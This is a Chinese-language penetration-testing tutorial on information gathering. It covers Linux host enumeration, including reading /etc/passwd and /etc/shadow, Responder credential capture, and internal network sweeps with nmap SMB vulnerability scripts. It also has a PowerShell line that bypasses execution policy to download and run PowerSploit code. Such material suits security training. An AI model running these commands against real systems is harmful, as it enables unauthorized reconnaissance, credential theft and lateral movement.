# Linux下信息收集



在linux环境下收集如下本机信息：

1. 系统类型
2. 内核版本
3. 进程
4. 安装的软件包
5. 服务配置
6. 网络配置
7. 网络通讯
8. 用户信息
9. 日志信息

### 实验步骤： <a id="-"></a>

#### 1.系统类型 <a id="1-"></a>

cat /etc/issue查看系统名称

![](https://p408.ssl.qhimgs4.com/t012b30c6dbe4eec94c.png)

lsb\_release查看系统名称、版本号

![](https://p408.ssl.qhimgs4.com/t01fc1b5984eabf1c13.png)

#### 2. 内核版本 <a id="2-"></a>

uname –a 查看所有信息

![](https://p408.ssl.qhimgs4.com/t01c0838b65d2594c14.png)

uname –mrs查看内核版本及架构

![](https://p408.ssl.qhimgs4.com/t01203663032aa55600.png)

#### 3. 进程 <a id="3-"></a>

ps aux 查看进程信息

![](https://p408.ssl.qhimgs4.com/t013752d7640a3db143.png)

ps –ef查看进程信息

![](https://p408.ssl.qhimgs4.com/t01dc8eb303b3a9a7fb.png)

#### 4. 安装的软件包 <a id="4-"></a>

使用dpkg –l查看安装的软件包

![](https://p408.ssl.qhimgs4.com/t01d0cd0ba189b50128.png)

![](https://p408.ssl.qhimgs4.com/t01afebf730c1cc04a9.png)

#### 5. 服务配置 <a id="5-"></a>

查看apache配置文件

![](https://p408.ssl.qhimgs4.com/t01429f40ea60308b5f.png)

![](https://p408.ssl.qhimgs4.com/t01fbaa247978f07036.png)

#### 6. 网络配置 <a id="6-"></a>

查看网卡配置文件

![](https://p408.ssl.qhimgs4.com/t018a5648c6e5a5e154.png)

查看dns配置文件

![](https://p408.ssl.qhimgs4.com/t0114a6831d40528891.png)

使用hostname查看主机名

![](https://p408.ssl.qhimgs4.com/t01326c2c74bfc0cc1b.png)

使用iptables –L查看防火墙配置（注意需要root权限）

![](https://p408.ssl.qhimgs4.com/t01a9c8110e318c7e85.png)

#### 7. 网络通讯 <a id="7-"></a>

使用netstat命令

![](https://p408.ssl.qhimgs4.com/t0122420db9b75d61ae.png)

![](https://p408.ssl.qhimgs4.com/t01a1774a36d95ffc56.png)

netstat –antlp 查看tcp socket

![](https://p408.ssl.qhimgs4.com/t016a6fb2fd25429c2a.png)

使用route查看路由

![](https://p408.ssl.qhimgs4.com/t0187c43c84c3fb2da3.png)

#### 8. 用户信息 <a id="8-"></a>

Whoami查看当前用户

![](https://p408.ssl.qhimgs4.com/t016d064c50ae307feb.png)

使用id查看当前用户id，组id

![](https://p408.ssl.qhimgs4.com/t01957c209d0c32ba0d.png)

cat /etc/passwd查看密码信息

![](https://p408.ssl.qhimgs4.com/t0115fc689a8154fc62.png)

cat /etc/group查看用户组信息

![](https://p408.ssl.qhimgs4.com/t01a3402e2e04094a5b.png)

cat /etc/shadow查看密码信息，需要root权限

![](https://p408.ssl.qhimgs4.com/t01ff53eb190c2fc87b.png)

#### 9. 日志信息 <a id="9-"></a>

Cat syslog查看系统日志

![](https://p408.ssl.qhimgs4.com/t01e6f62445daedddb1.png)

使用w 、who、lastlog等命令查看登陆日志

![](https://p408.ssl.qhimgs4.com/t01c13ee0d10965bc77.png)

#### 10. Responder使用 <a id="10-responder-"></a>

可修改Responder.py抓取要获得的内容

只抓取ftp

![](https://p408.ssl.qhimgs4.com/t01cbdee46482160fea.png)

```text
python Responder.py -h -I eth0 -A -f
```

### 扩散信息收集 <a id="-"></a>

#### Windows <a id="windows"></a>

**ICMP**

```text
for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.111.%I | findstr "TTL="
```

**netbios**

```text
nbtscan-1.0.35.exe 192.168.111.1/24
```

**nmap：根据环境考虑是否安装**

```text
nmap -sn -PM 192.168.111.0/24
```

扫描smb共享，顺便扫描几个漏洞

```text
nmap -sT -p 445,139,137  -T2 --open -v --script=smb-os-discovery.nse,smb-enum-shares.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse 192.168.111.0/24
```

![](https://p408.ssl.qhimgs4.com/t01373dae6756f61ba9.png)

**Powershell**

Invoke-TSPingSweep.ps1

```text
Import-Module .\Invoke-TSPingSweep.ps1
Invoke-TSPingSweep -StartAddress 192.168.111.1 -EndAddress 192.168.111.254 -ResolveHost -ScanPort -Port 3389 -TimeOut 500
```

Invoke-Portscan.ps1

```text
Import-Module .\Invoke-Portscan.ps1
Invoke-Portscan -Hosts 192.168.111.0/24 -T 4 -ports '3389,445' 
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.111.0/24 -T 4 -ports '3389,80' 
```

#### Linux <a id="linux"></a>

**ICMP**

```text
for i in 192.168.111.{1..254}; do if ping -c 3 -w 3 $i &>/dev/null; then echo $i is alived; fi; done
```

**netbios**

```text
wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgz
tar xf nbtscan-source-1.0.35.tgz
make
chmod +x nbtscan
./nbtscan 192.168.111.1/24
```

**arpscan**

```text
git clone https://github.com/attackdebris/arpscan.git
make
chmod +x arpscan
./arpscan
```

